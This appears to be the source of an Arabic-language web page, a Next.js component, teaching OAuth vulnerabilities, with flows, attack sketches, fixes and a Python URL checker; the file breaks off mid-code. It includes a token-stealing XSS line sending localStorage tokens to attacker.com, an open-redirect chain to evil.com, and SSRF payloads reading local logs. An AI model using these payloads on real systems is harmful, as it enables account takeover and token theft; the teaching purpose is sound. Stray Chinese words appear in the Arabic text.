import Link from 'next/link';
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import ShareButtons from '@/components/ShareButtons'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'

export const metadata = {
  title: 'ثغرات OAuth - OAuth Vulnerabilities | دليل أمن الويب',
  description: 'دليل شامل عن ثغرات OAuth وبروتوكولات التفويض وطرق الحماية والكشف',
};

export default function OAuthVulnerabilitiesPage() {
  return (
    <div dir="rtl" className="min-h-screen bg-gray-900 text-gray-100">
      {/* Header */}
      <header className="bg-gradient-to-l from-emerald-900 to-teal-900 py-16">
        <div className="container mx-auto px-4 max-w-4xl">
          <Link
            href="/"
            className="text-emerald-300 hover:text-emerald-200 text-sm mb-4 inline-block"
          >
            العودة للرئيسية
          </Link>
          <h1 className="text-4xl font-bold text-white mb-4">
            ثغرات OAuth - OAuth Vulnerabilities
          </h1>
          <p className="text-xl text-emerald-200">
            دليل شامل عن ثغرات بروتوكول التفويض وطرق الحماية
          </p>
        </div>
      </header>

      <div className="mb-6">
        <ShareButtons title="OAuth Vulnerabilities" url={"https://web-security-guide.vercel.app/vulnerabilities/oauth"} />
      </div>

      <main className="container mx-auto px-4 max-w-4xl py-12">
        {/* Table of Contents */}
        <nav className="bg-gray-800 rounded-xl p-6 mb-10 border border-gray-700">
          <h2 className="text-lg font-bold mb-4 text-emerald-300">محتويات الصفحة</h2>
          <ul className="space-y-2 text-sm">
            <li><a href="#definition" className="text-gray-300 hover:text-white">1. تعريف OAuth وكيف يعمل</a></li>
            <li><a href="#flows" className="text-gray-300 hover:text-white">2. تدفقات OAuth المختلفة</a></li>
            <li><a href="#vulnerabilities" className="text-gray-300 hover:text-white">3. أنواع ثغرات OAuth</a></li>
            <li><a href="#examples" className="text-gray-300 hover:text-white">4. أمثلة حقيقية بالكود</a></li>
            <li><a href="#detection" className="text-gray-300 hover:text-white">5. كيف تكشف ثغرات OAuth</a></li>
            <li><a href="#prevention" className="text-gray-300 hover:text-white">6. كيف تحمي تطبيقاتك</a></li>
            <li><a href="#tips" className="text-gray-300 hover:text-white">7. نصائح وأخطاء شائعة</a></li>
            <li><a href="#navigation" className="text-gray-300 hover:text-white">8. روابط التنقل</a></li>
          </ul>
        </nav>

        {/* Definition */}
        <section id="definition" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            1. تعريف OAuth وكيف يعمل
          </h2>

          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold mb-3">ما هو OAuth؟</h3>
            <p className="text-gray-300 leading-relaxed mb-4">
              OAuth 2.0 هو بروتوكول تفويض (Authorization Protocol) مفتوح القياس يسمح للمستخدمين بمنح تطبيقات ويب أو خدمات طرف ثالث وصول آمن لبياناتهم من خوادم أخرى دون الكشف عن كلمات المرور الخاصة بهم. يُستخدم بشكل واسع في ميزة &quot;تسجيل الدخول عبر Google/Facebook&quot;.
            </p>

            <div className="grid md:grid-cols-4 gap-4 mb-4">
              <div className="bg-emerald-900/30 rounded-lg p-4 border border-emerald-700">
                <h4 className="font-bold text-emerald-300 mb-2">Resource Owner (المالك)</h4>
                <p className="text-sm text-gray-300">المستخدم الذي يملك البيانات ويمكنه منح الوصول</p>
              </div>
              <div className="bg-blue-900/30 rounded-lg p-4 border border-blue-700">
                <h4 className="font-bold text-blue-300 mb-2">Client (العميل)</h4>
                <p className="text-sm text-gray-300">التطبيق الذي يطلب الوصول إلى البيانات</p>
              </div>
              <div className="bg-purple-900/30 rounded-lg p-4 border border-purple-700">
                <h4 className="font-bold text-purple-300 mb-2">Authorization Server</h4>
                <p className="text-sm text-gray-300">الخادم الذي يتحقق من هوية المستخدم ويصدر التوقيعات</p>
              </div>
              <div className="bg-orange-900/30 rounded-lg p-4 border border-orange-700">
                <h4 className="font-bold text-orange-300 mb-2">Resource Server</h4>
                <p className="text-sm text-gray-300">الخادم الذي يحتوي على بيانات المستخدم المحمية</p>
              </div>
            </div>

            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-yellow-300 mb-2">// سير عمل OAuth 2.0 العام (Authorization Code Flow):</p>
              <p className="text-gray-300">1. المستخدم ينقر &quot;تسجيل الدخول عبر Google&quot;</p>
              <p className="text-gray-300">2. التطبيق يُحوّل المستخدم إلى Google (Authorization Endpoint)</p>
              <p className="text-gray-300">3. المستخدم يُصادق ويمنح الصلاحية</p>
              <p className="text-gray-300">4. Google يُعيد المستخدم إلى التطبيق مع Authorization Code</p>
              <p className="text-gray-300">5. التطبيق يُرسل الـ Code إلى Google (Token Endpoint)</p>
              <p className="text-gray-300">6. Google يُصدر Access Token وRefresh Token</p>
              <p className="text-gray-300">7. التطبيق يستخدم Access Token للوصول للبيانات</p>
            </div>
          </div>
        </section>

        {/* OAuth Flows */}
        <section id="flows" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            2. تدفقات OAuth المختلفة
          </h2>

          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-blue-300 mb-3">Authorization Code Flow</h3>
            <p className="text-gray-300 mb-4">
              الأكثر أماناً. يُستخدم في تطبيقات الويب الخادمية حيث يمكن للخادم تخزين client_secret بأمان.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-green-300">// الخطوة 1: توجيه المستخدم إلى Authorization Server</p>
              <p className="text-gray-300">GET /authorize?</p>
              <p className="text-gray-300">&nbsp;&nbsp;response_type=code&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_id=CLIENT_ID&</p>
              <p className="text-gray-300">&nbsp;&nbsp;redirect_uri=https://app.com/callback&</p>
              <p className="text-gray-300">&nbsp;&nbsp;scope=read+write&</p>
              <p className="text-gray-300">&nbsp;&nbsp;state=random_csrf_token</p>
              <p className="text-yellow-300 mt-3">// الخطوة 2: تبادل الـ Code بـ Token</p>
              <p className="text-gray-300">POST /token</p>
              <p className="text-gray-300">&nbsp;&nbsp;grant_type=authorization_code&</p>
              <p className="text-gray-300">&nbsp;&nbsp;code=AUTH_CODE&</p>
              <p className="text-gray-300">&nbsp;&nbsp;redirect_uri=https://app.com/callback&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_id=CLIENT_ID&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_secret=CLIENT_SECRET</p>
            </div>
          </div>

          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-blue-300 mb-3">Authorization Code Flow with PKCE</h3>
            <p className="text-gray-300 mb-4">
              آمن أكثر. يُستخدم في تطبيقات الويب والموبايل where لا يمكن تخزين client_secret بأمان. يستخدم code_verifier و code_challenge بدلاً من client_secret.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-green-300">// إنشاء code_verifier و code_challenge</p>
              <p className="text-gray-300">code_verifier = random_string(43-128);</p>
              <p className="text-gray-300">code_challenge = base64url(sha256(code_verifier));</p>
              <p className="text-yellow-300 mt-3">// الخطوة 1: توجيه المستخدم</p>
              <p className="text-gray-300">GET /authorize?</p>
              <p className="text-gray-300">&nbsp;&nbsp;response_type=code&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_id=CLIENT_ID&</p>
              <p className="text-gray-300">&nbsp;&nbsp;redirect_uri=https://app.com/callback&</p>
              <p className="text-gray-300">&nbsp;&nbsp;code_challenge=CHALLENGE&</p>
              <p className="text-gray-300">&nbsp;&nbsp;code_challenge_method=S256</p>
              <p className="text-yellow-300 mt-3">// الخطوة 2: تبادل الـ Code</p>
              <p className="text-gray-300">POST /token</p>
              <p className="text-gray-300">&nbsp;&nbsp;grant_type=authorization_code&</p>
              <p className="text-gray-300">&nbsp;&nbsp;code=AUTH_CODE&</p>
              <p className="text-gray-300">&nbsp;&nbsp;code_verifier=ORIGINAL_VERIFIER</p>
            </div>
          </div>

          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-blue-300 mb-3">Client Credentials Flow</h3>
            <p className="text-gray-300 mb-4">
              يُستخدم في الاتصالات بين الخدمات (Machine-to-Machine) بدون تدخل المستخدم.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-gray-300">POST /token</p>
              <p className="text-gray-300">&nbsp;&nbsp;grant_type=client_credentials&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_id=CLIENT_ID&</p>
              <p className="text-gray-300">&nbsp;&nbsp;client_secret=CLIENT_SECRET&</p>
              <p className="text-gray-300">&nbsp;&nbsp;scope=api:read</p>
            </div>
          </div>

          <div className="bg-yellow-900/20 border border-yellow-700 rounded-xl p-4">
            <p className="text-yellow-200 text-sm">
              ⚠️ <strong>ملاحظة:</strong> Implicit Flow و Resource Owner Password Credentials (ROPC) يعتبران غير آمنين ولا يُنصح باستخدامهما. Implicit Flow كان يُستخدم في تطبيقات الويب Single-Page لكنه معرض لتسريب التوقيعات.
            </p>
          </div>
        </section>

        {/* Vulnerabilities */}
        <section id="vulnerabilities" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            3. أنواع ثغرات OAuth
          </h2>

          {/* CSRF */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 CSRF في OAuth (Cross-Site Request Forgery)</h3>
            <p className="text-gray-300 mb-4">
              هجوم CSRF في OAuth يحدث عندما يُنشئ المهاجم رابط تفويض مزور ويُقنع الضحية بالنقر عليه. بدون parameter <code className="bg-gray-700 px-1 rounded text-purple-300">state</code> صحيح، يمكن للمهاجم ربط حساب الضحية بحساب المهاجم.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 text-sm">
              <p className="text-yellow-300 mb-2">سيناريو الهجوم:</p>
              <ul className="space-y-1 text-gray-300 list-disc list-inside">
                <li>المهاجم يسجل الدخول بحسابه في تطبيق受害者 ويخزّن authorization code مرتبطاً بحسابه</li>
                <li>المهاجم ينشئ رابطاً مزوراً يحتوي على الـ code الخاص به</li>
                <li>الضحية ينقر الرابط ويربط حسابه بحساب المهاجم</li>
                <li>المهاجم يمكنه الوصول لبيانات الضحية من خلال حسابه</li>
              </ul>
            </div>
          </div>

          {/* Open Redirect */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 Open Redirect في OAuth</h3>
            <p className="text-gray-300 mb-4">
              إذا كان <code className="bg-gray-700 px-1 rounded text-purple-300">redirect_uri</code> غير مقيد بشكل كافٍ، يمكن للمهاجم تحويل Authorization Code إلى موقعه الخاص. هذا يسمح بسرقة الـ Code واستخراج التوقيع.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 text-sm">
              <p className="text-yellow-300 mb-2">أمثلة على redirect_uri ضعيف:</p>
              <ul className="space-y-1 text-gray-300 list-disc list-inside">
                <li>بدون تحقق دوميني: <code className="bg-gray-700 px-1 rounded">https://app.com/*</code></li>
                <li>تطابق جزئي: <code className="bg-gray-700 px-1 rounded">https://app.com/callback?*</code></li>
                <li>بدون تحقق بروتوكول: <code className="bg-gray-700 px-1 rounded">app.com/callback</code></li>
                <li>استخدام localhost للاختبار: <code className="bg-gray-700 px-1 rounded">http://localhost:3000/callback</code></li>
              </ul>
            </div>
          </div>

          {/* Token Leakage */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 تسريب التوقيعات (Token Leakage)</h3>
            <p className="text-gray-300 mb-4">
              يمكن تسريب Access Token أو Authorization Code عبر قنوات متعددة:
            </p>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-red-900/20 rounded-lg p-4 border border-red-700">
                <h4 className="font-bold text-red-300 text-sm mb-2">قنوات التسريب</h4>
                <ul className="text-xs text-gray-300 space-y-1 list-disc list-inside">
                  <li>Server-Side Request Forgery (SSRF)</li>
                  <li>日志 السجلات تحتوي على الـ URL الكامل</li>
                  <li>Referer Header في الطلبات الخارجية</li>
                  <li>Browser History (سجل التصفح)</li>
                  <li>Proxy Logs سجلات الوكيل</li>
                </ul>
              </div>
              <div className="bg-orange-900/20 rounded-lg p-4 border border-orange-700">
                <h4 className="font-bold text-orange-300 text-sm mb-2">المخاطر</h4>
                <ul className="text-xs text-gray-300 space-y-1 list-disc list-inside">
                  <li>استخدام التوقيع المسروق للوصول للبيانات</li>
                  <li>استمرار الجلسة بعد خروج المستخدم</li>
                  <li>الوصول لحسابات أخرى مرتبطة</li>
                  <li>سرقة بيانات حساسة</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Scope Abuse */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 إساءة استخدام الصلاحيات (Scope Abuse)</h3>
            <p className="text-gray-300 mb-4">
              يحدث عندما يطلب التطبيق صلاحيات أكبر مما يحتاجه، أو يستخدم الـ scope بشكل غير مشروع:
            </p>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                طلب scope أوسع من اللازم (مثلاً <code className="bg-gray-700 px-1 rounded">write</code> بدلاً من <code className="bg-gray-700 px-1 rounded">read</code>)
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                استخدام توقيع بـ scope معين للوصول لأطراف خارجية
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم التحقق من الصلاحيات الممنوحة عند استخدام الـ Token
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                تجاوز scope المحدد في أثناء الصلاحية
              </li>
            </ul>
          </div>

          {/* Token Hijacking via XSS */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 سرقة التوقيعات عبر XSS</h3>
            <p className="text-gray-300 mb-4">
              إذا خزّن التطبيق Access Token في <code className="bg-gray-700 px-1 rounded text-purple-300">localStorage</code> أو <code className="bg-gray-700 px-1 rounded text-purple-300">sessionStorage</code>، يمكن لأي ثغرة XSS سرقته. هذا خطير بشكل خاص في Implicit Flow حيث يظهر التوقيع في URL.
            </p>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm">
              <p className="text-red-300 mb-2">// سرقة التوقيع عبر XSS:</p>
              <p className="text-gray-300">{"fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));"}"</p>
              <p className="text-yellow-300 mt-3">// أو عبر URL في Implicit Flow:</p>
              <p className="text-gray-300">https://app.com/callback#access_token=SECRET_TOKEN</p>
            </div>
          </div>

          {/* Insufficient Client Validation */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 عدم التحقق الكافي من Client</h3>
            <p className="text-gray-300 mb-4">
              إذا لم يتحقق Authorization Server بشكل كافٍ من هوية Client، يمكن لأي تطبيق طلب تفويضات:
            </p>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم التحقق من client_id المُسجل في Authorization Server
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم التحقق من client_secret عند تبادل الـ Code
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                قبول redirect_uri غير مسجل مسبقاً
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم استخدام PKCE في التطبيقات العامة
              </li>
            </ul>
          </div>

          {/* Refresh Token Abuse */}
          <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
            <h3 className="text-xl font-bold text-red-400 mb-3">🔴 إساءة استخدام Refresh Token</h3>
            <p className="text-gray-300 mb-4">
              Refresh Token طويل الأجل يمكن استغلاله إذا تسرب أو تم سرقته:
            </p>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم تقييد Refresh Token بنطاق IP أو جهاز
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم تطبيق rotation للـ Refresh Token
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                عدم إلغاء التوقيعات عند تسجيل الخروج
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                استخدام Refresh Token واحد لجميع الأجهزة
              </li>
            </ul>
          </div>
        </section>

        {/* Examples */}
        <section id="examples" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            4. أمثلة حقيقية بالكود
          </h2>

          {/* Example 1: CSRF Attack */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">هجوم CSRF على OAuth</h3>
            <p className="text-gray-300 mb-4">如何 يهاجم المهاجم تدفق OAuth بدون state parameter:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// === الخادم المصاب (بدون state parameter) ===

// ❌ كود غير آمن - لا يوجد state parameter
app.get('/auth/github', (req, res) => {
  const authUrl = 'https://github.com/login/oauth/authorize?' +
    'client_id=' + GITHUB_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent('https://app.com/callback') + '&' +
    'scope=read:user';
  // لا يوجد state parameter!
  res.redirect(authUrl);
});

// === هجوم CSRF ===

// 1. المهاجم يسجل في التطبيق ويحصل على authorization code
const attackerCode = 'abc123';

// 2. المهاجم ينشئ صفحة HTML مغرضة
// attacker-page.html:
// <html>
// <body>
//   <h1>اضغط هنا للحصول على مكافأة!</h1>
//   <a href="https://victim-app.com/callback?code=ATTACKER_CODE">
//     اضغط هنا
//   </a>
// </body>
// </html>

// 3. عندما ينقر الضحية على الرابط:
// - الضحية يُحوّل إلى callback مع code الخاص بالمهاجم
// - التطبيق يستبدل جلسة الضحية بحساب المهاجم
// - المهاجم يمكنه الآن الوصول لبيانات الضحية!`}
              </code>
            </pre>
          </div>

          {/* Example 2: Open Redirect */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">هجوم Open Redirect</h3>
            <p className="text-gray-300 mb-4">كيف يستغل المهاجم redirect_uri الضعيف:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// === الخادم المصاب ===

// ❌ تحقق ضعيف من redirect_uri
app.get('/auth/google', (req, res) => {
  const { redirect_uri } = req.query;
  
  // خطأ: لا يوجد تحقق حقيقي
  const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' +
    'client_id=' + GOOGLE_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent(redirect_uri) + '&' +
    'scope=openid%20email&' +
    'response_type=code';
  
  res.redirect(authUrl);
});

// === الهجوم ===

// 1. المهاجم يكتشف ثغرة open redirect في التطبيق
// https://victim-app.com/redirect?url=https://evil.com

// 2. ينشئ رابط تفويض مزور
const maliciousAuthUrl = 
  'https://accounts.google.com/o/oauth2/v2/auth?' +
  'client_id=GOOGLE_CLIENT_ID&' +
  'redirect_uri=' + encodeURIComponent('https://victim-app.com/redirect?url=https://evil.com') + '&' +
  'scope=openid%20email&' +
  'response_type=code';

// 3. عندما ينقر الضحية ويعطي الصلاحية:
// - Google يُعيد Authorization Code إلى redirect_uri
// - redirect_uri يُحوّل الكود إلى evil.com
// - المهاجم يحصل على Authorization Code!
// - المهاجم يستخدم الكود للحصول على Access Token

// === الحل ===

// ✅ تحقق صارم من redirect_uri
const ALLOWED_REDIRECT_URIS = [
  'https://app.com/callback',
  'https://app.com/auth/callback',
];

app.get('/auth/google', (req, res) => {
  const { redirect_uri } = req.query;
  
  if (!ALLOWED_REDIRECT_URIS.includes(redirect_uri)) {
    return res.status(400).json({ error: 'Invalid redirect URI' });
  }
  
  // ... بقية الكود الآمن
});`}
              </code>
            </pre>
          </div>

          {/* Example 3: Token Theft via SSRF */}
          <div className="bg-gray-800 rounded-xl p-6 mb-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">سرقة التوقيع عبر SSRF</h3>
            <p className="text-gray-300 mb-4">كيف يمكن لثغرة SSRF سرقة Access Token:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`// === الخادم المصاب ===

// ❌ ثغرة SSRF في endpoint صورة الملف الشخصي
app.post('/api/avatar', async (req, res) => {
  const { imageUrl } = req.body;
  
  // خطأ: استخدام URL مباشرة من المستخدم
  const response = await fetch(imageUrl);
  const buffer = await response.buffer();
  
  // حفظ الصورة...
  res.json({ success: true });
});

// === الهجوم ===

// 1. المهاجم يكتشف الـ SSRF
// 2. ينشئ URL يقرأ authorization callback
const maliciousPayload = {
  imageUrl: 'https://victim-app.com/callback?code=STOLEN_CODE'
};

// أو باستخدام file:// protocol:
const maliciousPayload2 = {
  imageUrl: 'file:///var/log/oauth.log' // قراءة السجلات
};

// 3. الخادم يجلب المحتوى ويرسله للمهاجم
// 4. المهاجم يحصل على Authorization Code

// === الحل ===

// ✅ تقييد URLs المسموح بها
const ALLOWED_HOSTS = ['example.com', 'cdn.example.com'];

app.post('/api/avatar', async (req, res) => {
  const { imageUrl } = req.body;
  const url = new URL(imageUrl);
  
  if (!ALLOWED_HOSTS.includes(url.hostname)) {
    return res.status(400).json({ error: 'Invalid URL host' });
  }
  
  if (url.protocol !== 'https:') {
    return res.status(400).json({ error: 'Only HTTPS URLs allowed' });
  }
  
  // ... بقية الكود الآمن
});`}
              </code>
            </pre>
          </div>

          {/* Example 4: Secure Implementation */}
          <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
            <h3 className="text-xl font-bold text-yellow-400 mb-3">تطبيق آمن مع PKCE و State</h3>
            <p className="text-gray-300 mb-4">تطبيق OAuth آمن مع جميع الحمايات:</p>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`import crypto from 'crypto';
import { cookies } from 'next/headers';

// === جلب Authorization URL مع PKCE و State ===
app.get('/auth/github', (req, res) => {
  // 1. إنشاء state token عشوائي
  const state = crypto.randomBytes(32).toString('hex');
  
  // 2. إنشاء code_verifier و code_challenge لـ PKCE
  const codeVerifier = crypto.randomBytes(32)
    .toString('base64url');
  const codeChallenge = crypto.createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');
  
  // 3. حفظ القيم في session مع انتهاء صلاحية
  req.session.oauthState = state;
  req.session.codeVerifier = codeVerifier;
  req.session.oauthExpires = Date.now() + 600000; // 10 دقائق
  
  const authUrl = 'https://github.com/login/oauth/authorize?' +
    'client_id=' + GITHUB_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent('https://app.com/callback') + '&' +
    'scope=read:user&' +
    'state=' + state + '&' +
    'code_challenge=' + codeChallenge + '&' +
    'code_challenge_method=S256';
  
  res.redirect(authUrl);
});

// === Callback الآمن ===
app.get('/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // 1. التحقق من انتهاء الصلاحية
  if (Date.now() > req.session.oauthExpires) {
    return res.status(401).json({ error: 'OAuth session expired' });
  }
  
  // 2. التحقق من state parameter
  if (!state || state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }
  
  // 3. تنظيف الـ state بعد الاستخدام
  delete req.session.oauthState;
  
  // 4. تبادل الـ code بـ token مع PKCE
  const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      client_id: GITHUB_CLIENT_ID,
      client_secret: GITHUB_CLIENT_SECRET,
      code: code,
      redirect_uri: 'https://app.com/callback',
      code_verifier: req.session.codeVerifier,
    }),
  });
  
  const tokenData = await tokenResponse.json();
  
  // 5. حفظ التوقيع بشكل آمن
  cookies().set('access_token', tokenData.access_token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600,
    path: '/',
  });
  
  // 6. حذف code_verifier
  delete req.session.codeVerifier;
  
  res.redirect('/dashboard');
});`}
              </code>
            </pre>
          </div>
        </section>

        {/* Detection */}
        <section id="detection" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            5. كيف تكشف ثغرات OAuth
          </h2>

          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="font-bold text-blue-300 mb-3">أدوات الاختبار</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>Burp Suite</strong>
                    <p className="text-xs text-gray-400">插件 OAuthScanner لتحليل OAuth</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>OAuth Proxy</strong>
                    <p className="text-xs text-gray-400">أداة Intercept لتدفقات OAuth</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>Postman</strong>
                    <p className="text-xs text-gray-400">اختبار تدفقات OAuth بشكل يدوي</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-400">•</span>
                  <div>
                    <strong>OWASP ZAP</strong>
                    <p className="text-xs text-gray-400">插件 لإكتشاف ثغرات OAuth</p>
                  </div>
                </li>
              </ul>
            </div>

            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="font-bold text-blue-300 mb-3">علامات الثغرة</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>عدم وجود parameter state</strong>
                    <p className="text-xs text-gray-400">طلب التفويض بدون حماية CSRF</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>redirect_uri غير مقيد</strong>
                    <p className="text-xs text-gray-400">يقبل أي redirect URI</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>عدم استخدام PKCE</strong>
                    <p className="text-xs text-gray-400">تدفق بدون code_challenge</p>
                  </div>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-yellow-400">•</span>
                  <div>
                    <strong>Scope واسع غير مبرر</strong>
                    <p className="text-xs text-gray-400">طلب صلاحيات أكثر من اللازم</p>
                  </div>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-gray-800 rounded-xl p-6 mt-6 border border-gray-700">
            <h3 className="font-bold text-blue-300 mb-3">فحص يدوي بـ Python</h3>
            <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
              <code>
{`import requests
from urllib.parse import urlparse, parse_qs

def analyze_oauth_flow(auth_url):
    """تحليل رابط OAuth للثغرات المحتملة"""
    parsed = urlparse(auth_url)
    params = parse_qs(parsed.query)
    
    print("📋 تحليل رابط OAuth:")
    print(f"  Authorization Server: {parsed.hostname}")
    
    # فحص state parameter
    if 'state' not in params:
        print("🔴 خطر: لا يوجد state parameter! (CSRF ممكن)")
    else:
        state = params['state'][0]
        if len(state) < 16:
            print("⚠️ تحذير: state parameter قصير جداً")
        else:
            print("✅ state parameter موجود وطويل بما يكفي")
    
    # فحص redirect_uri
    if 'redirect_uri' in params:
        redirect_uri = params['redirect_uri'][0]
        parsed_redirect = urlparse(redirect_uri)
        
        if parsed_redirect.scheme != 'https':
            print("⚠️ تحذير: redirect_uri لا يستخدم HTTPS")
        
        if '*' in redirect_uri:
            print("🔴 خطر: redirect_uri يحتوي على wildcard!")
    
    # فحص PKCE
    if 'code_challenge' not in params:
        print("⚠️ تحذير: لا يوجد code_challenge (PKCE غير مستخدم)")
    else:
        method = params.get('code_challenge_method', ['plain'])[0]
        if method == 'plain':
            print("⚠️ تحذير: code_challenge_method يستخدم plain بدلاً من S256")
        else:
            print("✅ PKCE مفعّل مع S256")
    
    # فحص scope
    if 'scope' in params:
        scopes = params['scope'][0].split(' ')
        write_scopes = [s for s in scopes if 'write' in s or 'delete' in s]
        if write_scopes:
            print(f"⚠️ تحذير: scope يحتوي على صلاحيات كتابة: {write_scopes}")
    
    # فحص response_type
    response_type = params.get('response_type', [''])[0]
    if response_type == 'token':
        print("🔴 خطر: يستخدم Implicit Flow (غير آمن)")

# استخدام الدالة
analyze_oauth_flow(
    "https://github.com/login/oauth/authorize?" +
    "client_id=abc123&redirect_uri=https://app.com/callback&scope=read:user"
)`}
              </code>
            </pre>
          </div>
        </section>

        {/* Prevention */}
        <section id="prevention" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            6. كيف تحمي تطبيقاتك
          </h2>

          <div className="space-y-6">
            {/* State Parameter */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">1. استخدام State Parameter (حماية CSRF)</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ إنشاء وتحقق من state parameter
import crypto from 'crypto';
import { cookies } from 'next/headers';

// عند بدء عملية التفويض
app.get('/auth/github', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  
  // حفظ الـ state في session أو cookie مشفر
  req.session.oauthState = state;
  
